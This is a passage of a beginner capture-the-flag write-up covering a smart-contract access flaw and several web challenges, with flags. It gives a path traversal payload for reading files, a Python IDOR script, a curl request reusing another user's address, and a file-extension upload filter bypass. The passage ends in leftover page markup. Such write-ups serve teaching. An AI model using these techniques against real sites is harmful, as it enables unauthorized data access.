That&#x27;s the basic challenge, but I wanted to raise the concern that in the dapps world there is huge immaturity from the developers in their approach of integrating blockchain with old technologies ( web tech in this situation ). If you check the contract&#x27;s source code by using the `etherscan`.

```js
function canPass(address contributorAddress) public view returns (bool) {
        return contributors[contributorAddress] &gt;= MINIMUM_CONTRIBUTION;
    }
```

Okay so it&#x27;s passing the address and checking if it has sent ethers or not. Seeing the client of the dapp, It&#x27;s sending the address

![Request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/vulnerable-request_cdtawm.png)

So, the server is actually checking if the user sent the ethers or not by calling the canPass from the contract. Wait, there is no mechanism to ensure that it&#x27;s the same user who sent the ethers is using the dapp right now.

I even sent ethers myself to the contract so anyone can grab my address and send it to the api to get the flag :)

![Other](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/greedy-robots-tx-logs_mnv9z5.png)

```bash
curl  https://greedy-robots.ctf.securinets.tn/api/flag --json &#x27;{{&quot;address&quot;:&quot;0x84e7a3679A82C2766Ff8382862ab883FF9460307&quot;}}
```

![Evil R0b0t](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/evil-robot_ic0ajq.png)

Now you get the challenge name `securinets{p0intless_g3n3ros1tY}`

### #8 Lesson learned

The weakest link in blockchain is its integration with current technologies. Never forget the old arts !

---

---

# Web

## Cr4zy-Js0n

![Cr4zy-Js0n](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/crazy-json_xbuh1l.png)

I really want to apologize for the confusion this task has created. I wanted to expose the beginner to JSON which is a data format commonly used in web application nowadays. Didn&#x27;t mean to create confusion on getting answers to the gates. I wanted it to be a fun task :/ .

#### **Solution**

```bash
curl URL -X POST --json &#x27;{&quot;answers&quot;:[{&quot;Gate One&quot;:&quot;Man&quot;},{&quot;Gate Two&quot;:true},{&quot;Gate Three&quot;:12}]}&#x27;
```

`securinets{w3b_5p34k5_j50n_It_S4fe?}`

---

## Agent-007

![Agent-007](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/agent-007_k9g2vn.png)

#### **Solution**

User-agent header to identify user&#x27;s browser. Used to identify secret agents.

```bash
`curl URL -H &quot;User-Agent: James Bond&quot;`
```

## L0ki-Was-L0st

![L0ki-Was-L0st](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924213/Friendly-ctf/l0ki-w4s-l0st_ynzmxn.png)

&gt; I didn&#x27;t watch the movie/serie It&#x27;s totally inspired for my interest for Nordic/Pagan Mythology :P

Simple LFI vulnerability on `page` url paramater. get the flag by visiting `URL?page=../../../flag.txt`.

`securinets{L00k_4_LF1_N0T_F0R_L0K1}`

## F00ly-F4ct0ry

![F00ly-F4ct0ry](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924232/Friendly-ctf/fooly-f4ctory_hv3dwq.png)

- [IDOR ressource](https://portswigger.net/web-security/access-control/idor)

```py
import requests
import os

URL=&#x27;URL_HERE&#x27;


session = requests.Session()
with requests.Session() as s:
    login_resp= s.post(URL+&#x27;/login&#x27;,data={&quot;username&quot;:&quot;test2&quot;,&quot;password&quot;:&quot;test2&quot;})
    mecha_resp= s.get(URL+&#x27;/mecha/1&#x27;)

    start_flag_index=mecha_resp.text.index(&#x27;securinets&#x27;)
    end_flag_index=mecha_resp.text.index(&#x27;}&#x27;)
    print(mecha_resp.text[start_flag_index:end_flag_index+1])
```

`securinets{F00LY_ID0R_Is_C00L}`

## F4ke-Upl04d

Here we will apply the basic upload filter bypass technique which is changing the file extension.

In the website, it asks only for png/pdf. So how about we modify a `document.pdf` to `document.pdf.png` ?
It&#x27;s checking for file extension only so by sending a faked file extension it gives you the flag !

`securinets{4lw4y5_ch3ck_m461c_numb3r5}`

## After words

I am glad to see you all enjoyed our CTF and learned new things. That&#x27;s the first time I write in a CTF and I loved seeing people enjoying the CTF and some of my task (definitely not Cr4zy-Js0n). In Securinets INSAT, We are going soon to have workshops where beginners who want to advance will have the opportunity to. Follow us on social media for our upcoming news and events !
"/><meta property="og:image" content="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664926666/Friendly-ctf/friendly-banner_mbdaso.jpg"/><meta name="google-site-verification" content="8uYSPvcdlfOzE8ienPTU-uSpjLTnUIyRKDOBDnlzWmg"/><link rel="icon" href="/favicon.ico"/><meta name="next-head-count" content="10"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="true"/><link href="/fonts/Inversionz_Unboxed.ttf"/><link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/4e8ce417027ce9fd.css" as="style"/><link rel="stylesheet" href="/_next/static/css/4e8ce417027ce9fd.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-cb7634a8b6194820.js" defer=""></script><script src="/_next/static/chunks/framework-bb5c596eafb42b22.js" defer=""></script><script src="/_next/static/chunks/main-7d56226aa235ba8d.js" defer=""></script><script src="/_next/static/chunks/pages/_app-67eaf2f8eab9cd46.js" defer=""></script><script src="/_next/static/chunks/d7eeaac4-bfe9755f1bf975fd.js" defer=""></script><script src="/_next/static/chunks/386-6717aabe367a6d08.js" defer=""></script><script src="/_next/static/chunks/51-d003c1d266fa4195.js" defer=""></script><script src="/_next/static/chunks/934-578fd7722a3726cf.js" defer=""></script><script src="/_next/static/chunks/803-9857b6c9f5157efd.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-5dde6950f5b739f0.js" defer=""></script><script src="/_next/static/0ISm-a3DlXowWUoWCA_lL/_buildManifest.js" defer=""></script><script src="/_next/static/0ISm-a3DlXowWUoWCA_lL/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Iceland&display=swap">@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPWK8.woff) format('woff')}@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style><style data-href="https://fonts.googleapis.com/css2?family=Iceland&family=Sen:wght@400;700;800&display=swap">@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPWK8.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_HmA.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CoKQ.woff) format('woff')}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OoKQ.woff) format('woff')}@font-face{font-family:'Iceland';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/iceland/v16/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_3kvWNAGn5LEwJ.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKjdSxYI9_3nPWNAGn5LA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CYI0v0BnYASNr7.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CYLUv0BnYASA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OYI0v0BnYASNr7.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OYLUv0BnYASA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next" data-reactroot=""><style data-emotion="css-global 3v2x1q">:host,:root{--chakra-ring-inset:var(--chakra-empty,/*!*/ /*!*/);--chakra-ring-offset-width:0px;--chakra-ring-offset-color:#fff;--chakra-ring-color:rgba(66, 153, 225, 0.6);--chakra-ring-offset-shadow:0 0 #0000;--chakra-ring-shadow:0 0 #0000;--chakra-space-x-reverse:0;--chakra-space-y-reverse:0;--chakra-colors-transparent:transparent;--chakra-colors-current:currentColor;--chakra-colors-black:#000000;--chakra-colors-white:#FFFFFF;--chakra-colors-whiteAlpha-50:rgba(255, 255, 255, 0.04);--chakra-colors-whiteAlpha-100:rgba(255, 255, 255, 0.06);--chakra-colors-whiteAlpha-200:rgba(255, 255, 255, 0.08);--chakra-colors-whiteAlpha-300:rgba(255, 255, 255, 0.16);--chakra-colors-whiteAlpha-400:rgba(255, 255, 255, 0.24);--chakra-colors-whiteAlpha-500:rgba(255, 255, 255, 0.36);--chakra-colors-whiteAlpha-600:rgba(255, 255, 255, 0.48);--chakra-colors-whiteAlpha-700:rgba(255, 255, 255, 0.64);--chakra-colors-whiteAlpha-800:rgba(255, 255, 255, 0.80);--chakra-colors-whiteAlpha-900:rgba(255, 255, 255, 0.92);--chakra-colors-blackAlpha-50:rgba(0, 0, 0, 0.04);--chakra-colors-blackAlpha-100:rgba(0, 0, 0, 0.06);--chakra-colors-blackAlpha-200:rgba(0, 0, 0, 0.08);--chakra-colors-blackAlpha-300:rgba(0, 0, 0, 0.16);--chakra-colors-blackAlpha-400:rgba(0, 0, 0, 0.24);--chakra-colors-blackAlpha-500:rgba(0, 0, 0, 0.36);--chakra-colors-blackAlpha-600:rgba(0, 0, 0, 0.48);--chakra-colors-blackAlpha-700:rgba(0, 0, 0, 0.64);--chakra-colors-blackAlpha-800:rgba(0, 0, 0, 0.80);--chakra-colors-blackAlpha-900:rgba(0, 0, 0, 0.92);--chakra-colors-gray-50:#F7FAFC;--chakra-colors-gray-100:#EDF2F7;--chakra-colors-gray-200:#E2E8F0;--chakra-colors-gray-300:#CBD5E0;--chakra-colors-gray-400:#A0AEC0;--chakra-colors-gray-500:#718096;--chakra-colors-gray-600:#4A5568;--chakra-colors-gray-700:#2D3748;--chakra-colors-gray-800:#1A202C;--chakra-colors-gray-900:#171923;--chakra-colors-red-50:#FFF5F5;--chakra-colors-red-100:#FED7D7;--chakra-colors-red-200:#FEB2B2;--chakra-colors-red-300:#FC8181;--chakra-colors-red-400:#F56565;--chakra-colors-red-500:#E53E3E;--chakra-colors-red-600:#C53030;--chakra-colors-red-700:#9B2C2C;--chakra-colors-red-800:#822727;--chakra-colors-red-900:#63171B;--chakra-colors-orange-50:#FFFAF0;--chakra-colors-orange-100:#FEEBC8;--chakra-colors-orange-200:#FBD38D;--chakra-colors-orange-300:#F6AD55;--chakra-colors-orange-400:#ED8936;--chakra-colors-orange-500:#DD6B20;--chakra-colors-orange-600:#C05621;--chakra-colors-orange-700:#9C4221;--chakra-colors-orange-800:#7B341E;--chakra-colors-orange-900:#652B19;--chakra-colors-yellow-50:#FFFFF0;--chakra-colors-yellow-100:#FEFCBF;--chakra-colors-yellow-200:#FAF089;--chakra-colors-yellow-300:#F6E05E;--chakra-colors-yellow-400:#ECC94B;--chakra-colors-yellow-500:#D69E2E;--chakra-colors-yellow-600:#B7791F;--chakra-colors-yellow-700:#975A16;--chakra-colors-yellow-800:#744210;--chakra-colors-yellow-900:#5F370E;--chakra-colors-green-50:#F0FFF4;--chakra-colors-green-100:#C6F6D5;--chakra-colors-green-200:#9AE6B4;--chakra-colors-green-300:#68D391;--chakra-colors-green-400:#48BB78;--chakra-colors-green-500:#38A169;--chakra-colors-green-600:#2F855A;--chakra-colors-green-700:#276749;--chakra-colors-green-800:#22543D;--chakra-colors-green-900:#1C4532;--chakra-colors-teal-50:#E6FFFA;--chakra-colors-teal-100:#B2F5EA;--chakra-colors-teal-200:#81E6D9;--chakra-colors-teal-300:#4FD1C5;--chakra-colors-teal-400:#38B2AC;--chakra-colors-teal-500:#319795;--chakra-colors-teal-600:#2C7A7B;--chakra-colors-teal-700:#285E61;--chakra-colors-teal-800:#234E52;--chakra-colors-teal-900:#1D4044;--chakra-colors-blue-50:#ebf8ff;--chakra-colors-blue-100:#bee3f8;--chakra-colors-blue-200:#90cdf4;--chakra-colors-blue-300:#63b3ed;--chakra-colors-blue-400:#4299e1;--chakra-colors-blue-500:#3182ce;--chakra-colors-blue-600:#2b6cb0;--chakra-colors-blue-700:#2c5282;--chakra-colors-blue-800:#2a4365;--chakra-colors-blue-900:#1A365D;--chakra-colors-cyan-50:#EDFDFD;--chakra-colors-cyan-100:#C4F1F9;--chakra-colors-cyan-200:#9DECF9;--chakra-colors-cyan-300:#76E4F7;--chakra-colors-cyan-400:#0BC5EA;--chakra-colors-cyan-500:#00B5D8;--chakra-colors-cyan-600:#00A3C4;--chakra-colors-cyan-700:#0987A0;--chakra-colors-cyan-800:#086F83;--chakra-colors-cyan-900:#065666;--chakra-colors-purple-50:#FAF5FF;--chakra-colors-purple-100:#E9D8FD;--chakra-colors-purple-200:#D6BCFA;--chakra-colors-purple-300:#B794F4;--chakra-colors-purple-400:#9F7AEA;--chakra-colors-purple-500:#805AD5;--chakra-colors-purple-600:#6B46C1;--chakra-colors-purple-700:#553C9A;--chakra-colors-purple-800:#44337A;--chakra-colors-purple-900:#322659;--chakra-colors-pink-50:#FFF5F7;--chakra-colors-pink-100:#FED7E2;--chakra-colors-pink-200:#FBB6CE;--chakra-colors-pink-300:#F687B3;--chakra-colors-pink-400:#ED64A6;--chakra-colors-pink-500:#D53F8C;--chakra-colors-pink-600:#B83280;--chakra-colors-pink-700:#97266D;--chakra-colors-pink-800:#702459;--chakra-colors-pink-900:#521B41;--chakra-colors-linkedin-50:#E8F4F9;--chakra-colors-linkedin-100:#CFEDFB;--chakra-colors-linkedin-200:#9BDAF3;--chakra-colors-linkedin-300:#68C7EC;--chakra-colors-linkedin-400:#34B3E4;--chakra-colors-linkedin-500:#00A0DC;--chakra-colors-linkedin-600:#008CC9;--chakra-colors-linkedin-700:#0077B5;--chakra-colors-linkedin-800:#005E93;--chakra-colors-linkedin-900:#004471;--chakra-colors-facebook-50:#E8F4F9;--chakra-colors-facebook-100:#D9DEE9;--chakra-colors-facebook-200:#B7C2DA;--chakra-colors-facebook-300:#6482C0;--chakra-colors-facebook-400:#4267B2;--chakra-colors-facebook-500:#385898;--chakra-colors-facebook-600:#314E89;--chakra-colors-facebook-700:#29487D;--chakra-colors-facebook-800:#223B67;--chakra-colors-facebook-900:#1E355B;--chakra-colors-messenger-50:#D0E6FF;--chakra-colors-messenger-100:#B9DAFF;--chakra-colors-messenger-200:#A2CDFF;--chakra-colors-messenger-300:#7AB8FF;--chakra-colors-messenger-400:#2E90FF;--chakra-colors-messenger-500:#0078FF;--chakra-colors-messenger-600:#0063D1;--chakra-colors-messenger-700:#0052AC;--chakra-colors-messenger-800:#003C7E;--chakra-colors-messenger-900:#002C5C;--chakra-colors-whatsapp-50:#dffeec;--chakra-colors-whatsapp-100:#b9f5d0;--chakra-colors-whatsapp-200:#90edb3;--chakra-colors-whatsapp-300:#65e495;--chakra-colors-whatsapp-400:#3cdd78;--chakra-colors-whatsapp-500:#22c35e;--chakra-colors-whatsapp-600:#179848;--chakra-colors-whatsapp-700:#0c6c33;--chakra-colors-whatsapp-800:#01421c;--chakra-colors-whatsapp-900:#001803;--chakra-colors-twitter-50:#E5F4FD;--chakra-colors-twitter-100:#C8E9FB;--chakra-colors-twitter-200:#A8DCFA;--chakra-colors-twitter-300:#83CDF7;--chakra-colors-twitter-400:#57BBF5;--chakra-colors-twitter-500:#1DA1F2;--chakra-colors-twitter-600:#1A94DA;--chakra-colors-twitter-700:#1681BF;--chakra-colors-twitter-800:#136B9E;--chakra-colors-twitter-900:#0D4D71;--chakra-colors-telegram-50:#E3F2F9;--chakra-colors-telegram-100:#C5E4F3;--chakra-colors-telegram-200:#A2D4EC;--chakra-colors-telegram-300:#7AC1E4;--chakra-colors-telegram-400:#47A9DA;--chakra-colors-telegram-500:#0088CC;--chakra-colors-telegram-600:#007AB8;--chakra-colors-telegram-700:#006BA1;--chakra-colors-telegram-800:#005885;--chakra-colors-telegram-900:#003F5E;--chakra-colors-darkBackground:#16222A;--chakra-colors-lightSecondary:#143258;--chakra-colors-cardDark:#25313A;--chakra-colors-cardDark2:#293640;--chakra-colors-darkSecondary:#CFE4FF;--chakra-colors-lightBackground:#ECEEF1;--chakra-borders-none:0;--chakra-borders-1px:1px solid;--chakra-borders-2px:2px solid;--chakra-borders-4px:4px solid;--chakra-borders-8px:8px solid;--chakra-fonts-heading:Iceland;--chakra-fonts-body:Iceland;--chakra-fonts-mono:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--chakra-fonts-display:Inversionz Unboxed;--chakra-fontSizes-xs:0.75rem;--chakra-fontSizes-sm:0.875rem;--chakra-fontSizes-md:1rem;--chakra-fontSizes-lg:1.125rem;--chakra-fontSizes-xl:1.25rem;--chakra-fontSizes-2xl:1.5rem;--chakra-fontSizes-3xl:1.875rem;--chakra-fontSizes-4xl:2.25rem;--chakra-fontSizes-5xl:3rem;--chakra-fontSizes-6xl:3.75rem;--chakra-fontSizes-7xl:4.5rem;--chakra-fontSizes-8xl:6rem;--chakra-fontSizes-9xl:8rem;--chakra-fontWeights-hairline:100;--chakra-fontWeights-thin:200;--chakra-fontWeights-light:300;--chakra-fontWeights-normal:400;--chakra-fontWeights-medium:500;--chakra-fontWeights-semibold:600;--chakra-fontWeights-bold:700;--chakra-fontWeights-extrabold:800;--chakra-fontWeights-black:900;--chakra-letterSpacings-tighter:-0.05em;--chakra-letterSpacings-tight:-0.025em;--chakra-letterSpacings-normal:0;--chakra-letterSpacings-wide:0.025em;--chakra-letterSpacings-wider:0.05em;--chakra-letterSpacings-widest:0.1em;--chakra-lineHeights-3:.75rem;--chakra-lineHeights-4:1rem;--chakra-lineHeights-5:1.25rem;--chakra-lineHeights-6:1.5rem;--chakra-lineHeights-7:1.75rem;--chakra-lineHeights-8:2rem;--chakra-lineHeights-9:2.25rem;--chakra-lineHeights-10:2.5rem;--chakra-lineHeights-normal:normal;--chakra-lineHeights-none:1;--chakra-lineHeights-shorter:1.25;--chakra-lineHeights-short:1.375;--chakra-lineHeights-base:1.5;--chakra-lineHeights-tall:1.625;--chakra-lineHeights-taller:2;--chakra-radii-none:0;--chakra-radii-sm:0.125rem;--chakra-radii-base:0.25rem;--chakra-radii-md:0.375rem;--chakra-radii-lg:0.5rem;--chakra-radii-xl:0.75rem;--chakra-radii-2xl:1rem;--chakra-radii-3xl:1.5rem;--chakra-radii-full:9999px;--chakra-space-1:0.25rem;--chakra-space-2:0.5rem;--chakra-space-3:0.75rem;--chakra-space-4:1rem;--chakra-space-5:1.25rem;--chakra-space-6:1.5rem;--chakra-space-7:1.75rem;--chakra-space-8:2rem;--chakra-space-9:2.25rem;--chakra-space-10:2.5rem;--chakra-space-12:3rem;--chakra-space-14:3.5rem;--chakra-space-16:4rem;--chakra-space-20:5rem;--chakra-space-24:6rem;--chakra-space-28:7rem;--chakra-space-32:8rem;--chakra-space-36:9rem;--chakra-space-40:10rem;--chakra-space-44:11rem;--chakra-space-48:12rem;--chakra-space-52:13rem;--chakra-space-56:14rem;--chakra-space-60:15rem;--chakra-space-64:16rem;--chakra-space-72:18rem;--chakra-space-80:20rem;--chakra-space-96:24rem;--chakra-space-px:1px;--chakra-space-0\.5:0.125rem;--chakra-space-1\.5:0.375rem;--chakra-space-2\.5:0.625rem;--chakra-space-3\.5:0.875rem;--chakra-shadows-xs:0 0 0 1px rgba(0, 0, 0, 0.05);--chakra-shadows-sm:0 1px 2px 0 rgba(0, 0, 0, 0.05);--chakra-shadows-base:0 1px 3px 0 rgba(0, 0, 0, 0.1),0 1px 2px 0 rgba(0, 0, 0, 0.06);--chakra-shadows-md:0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);--chakra-shadows-lg:0 10px 15px -3px rgba(0, 0, 0, 0.1),0 4px 6px -2px rgba(0, 0, 0, 0.05);--chakra-shadows-xl:0 20px 25px -5px rgba(0, 0, 0, 0.1),0 10px 10px -5px rgba(0, 0, 0, 0.04);--chakra-shadows-2xl:0 25px 50px -12px rgba(0, 0, 0, 0.25);--chakra-shadows-outline:0 0 0 3px rgba(66, 153, 225, 0.6);--chakra-shadows-inner:inset 0 2px 4px 0 rgba(0,0,0,0.06);--chakra-shadows-none:none;--chakra-shadows-dark-lg:rgba(0, 0, 0, 0.1) 0px 0px 0px 1px,rgba(0, 0, 0, 0.2) 0px 5px 10px,rgba(0, 0, 0, 0.4) 0px 15px 40px;--chakra-sizes-1:0.25rem;--chakra-sizes-2:0.5rem;--chakra-sizes-3:0.75rem;--chakra-sizes-4:1rem;--chakra-sizes-5:1.25rem;--chakra-sizes-6:1.5rem;--chakra-sizes-7:1.75rem;--chakra-sizes-8:2rem;--chakra-sizes-9:2.25rem;--chakra-sizes-10:2.5rem;--chakra-sizes-12:3rem;--chakra-sizes-14:3.5rem;--chakra-sizes-16:4rem;--chakra-sizes-20:5rem;--chakra-sizes-24:6rem;--chakra-sizes-28:7rem;--chakra-sizes-32:8rem;--chakra-sizes-36:9rem;--chakra-sizes-40:10rem;--chakra-sizes-44:11rem;--chakra-sizes-48:12rem;--chakra-sizes-52:13rem;--chakra-sizes-56:14rem;--chakra-sizes-60:15rem;--chakra-sizes-64:16rem;--chakra-sizes-72:18rem;--chakra-sizes-80:20rem;--chakra-sizes-96:24rem;--chakra-sizes-px:1px;--chakra-sizes-0\.5:0.125rem;--chakra-sizes-1\.5:0.375rem;--chakra-sizes-2\.5:0.625rem;--chakra-sizes-3\.5:0.875rem;--chakra-sizes-max:max-content;--chakra-sizes-min:min-content;--chakra-sizes-full:100%;--chakra-sizes-3xs:14rem;--chakra-sizes-2xs:16rem;--chakra-sizes-xs:20rem;--chakra-sizes-sm:24rem;--chakra-sizes-md:28rem;--chakra-sizes-lg:32rem;--chakra-sizes-xl:36rem;--chakra-sizes-2xl:42rem;--chakra-sizes-3xl:48rem;--chakra-sizes-4xl:56rem;--chakra-sizes-5xl:64rem;--chakra-sizes-6xl:72rem;--chakra-sizes-7xl:80rem;--chakra-sizes-8xl:90rem;--chakra-sizes-container-sm:640px;--chakra-sizes-container-md:768px;--chakra-sizes-container-lg:1024px;--chakra-sizes-container-xl:1280px;--chakra-zIndices-hide:-1;--chakra-zIndices-auto:auto;--chakra-zIndices-base:0;--chakra-zIndices-docked:10;--chakra-zIndices-dropdown:1000;--chakra-zIndices-sticky:1100;--chakra-zIndices-banner:1200;--chakra-zIndices-overlay:1300;--chakra-zIndices-modal:1400;--chakra-zIndices-popover:1500;--chakra-zIndices-skipLink:1600;--chakra-zIndices-toast:1700;--chakra-zIndices-tooltip:1800;--chakra-transition-property-common:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform;--chakra-transition-property-colors:background-color,border-color,color,fill,stroke;--chakra-transition-property-dimensions:width,height;--chakra-transition-property-position:left,right,top,bottom;--chakra-transition-property-background:background-color,background-image,background-position;--chakra-transition-easing-ease-in:cubic-bezier(0.4, 0, 1, 1);--chakra-transition-easing-ease-out:cubic-bezier(0, 0, 0.2, 1);--chakra-transition-easing-ease-in-out:cubic-bezier(0.4, 0, 0.2, 1);--chakra-transition-duration-ultra-fast:50ms;--chakra-transition-duration-faster:100ms;--chakra-transition-duration-fast:150ms;--chakra-transition-duration-normal:200ms;--chakra-transition-duration-slow:300ms;--chakra-transition-duration-slower:400ms;--chakra-transition-duration-ultra-slow:500ms;--chakra-blur-none:0;--chakra-blur-sm:4px;--chakra-blur-base:8px;--chakra-blur-md:12px;--chakra-blur-lg:16px;--chakra-blur-xl:24px;--chakra-blur-2xl:40px;--chakra-blur-3xl:64px;}</style><style data-emotion="css-global 1jqlf9g">html{line-height:1.5;-webkit-text-size-adjust:100%;font-family:system-ui,sans-serif;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;-moz-osx-font-smoothing:grayscale;touch-action:manipulation;}body{position:relative;min-height:100%;font-feature-settings:'kern';}*,*::before,*::after{border-width:0;border-style:solid;box-sizing:border-box;}main{display:block;}hr{border-top-width:1px;box-sizing:content-box;height:0;overflow:visible;}pre,code,kbd,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:1em;}a{background-color:transparent;color:inherit;-webkit-text-decoration:inherit;text-decoration:inherit;}abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;}b,strong{font-weight:bold;}small{font-size:80%;}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline;}sub{bottom:-0.25em;}sup{top:-0.5em;}img{border-style:none;}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0;}button,input{overflow:visible;}button,select{text-transform:none;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0;}fieldset{padding:0.35em 0.75em 0.625em;}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal;}progress{vertical-align:baseline;}textarea{overflow:auto;}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0;}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{-webkit-appearance:none!important;}input[type="number"]{-moz-appearance:textfield;}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px;}[type="search"]::-webkit-search-decoration{-webkit-appearance:none!important;}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}details{display:block;}summary{display:-webkit-box;display:-webkit-list-item;display:-ms-list-itembox;display:list-item;}template{display:none;}[hidden]{display:none!important;}body,blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0;}button{background:transparent;padding:0;}fieldset{margin:0;padding:0;}ol,ul{margin:0;padding:0;}textarea{resize:vertical;}button,[role="button"]{cursor:pointer;}button::-moz-focus-inner{border:0!important;}table{border-collapse:collapse;}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit;}button,input,optgroup,select,textarea{padding:0;line-height:inherit;color:inherit;}img,svg,video,canvas,audio,iframe,embed,object{display:block;}img,video{max-width:100%;height:auto;}[data-js-focus-visible] :focus:not([data-focus-visible-added]){outline:none;box-shadow:none;}select::-ms-expand{display:none;}</style><style data-emotion="css-global 4j7nz">body{font-family:var(--chakra-fonts-body);color:var(--chakra-colors-lightSecondary);background:var(--chakra-colors-lightBackground);transition-property:background-color;transition-duration:var(--chakra-transition-duration-normal);line-height:var(--chakra-lineHeights-base);}*::-webkit-input-placeholder{color:var(--chakra-colors-gray-400);}*::-moz-placeholder{color:var(--chakra-colors-gray-400);}*:-ms-input-placeholder{color:var(--chakra-colors-gray-400);}*::placeholder{color:var(--chakra-colors-gray-400);}*,*::before,::after{border-color:var(--chakra-colors-gray-200);word-wrap:break-word;}</style><style data-emotion="css 29kohe">.css-29kohe{display:grid;grid-column-gap:var(--chakra-space-1);grid-template-columns:repeat(6,1fr);z-index:var(--chakra-zIndices-banner);position:fixed;left:0px;top:0px;background-color:var(--chakra-colors-lightBackground);height:8vh;min-height:100px;width:var(--chakra-sizes-full);padding-left:var(--chakra-space-2);-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media 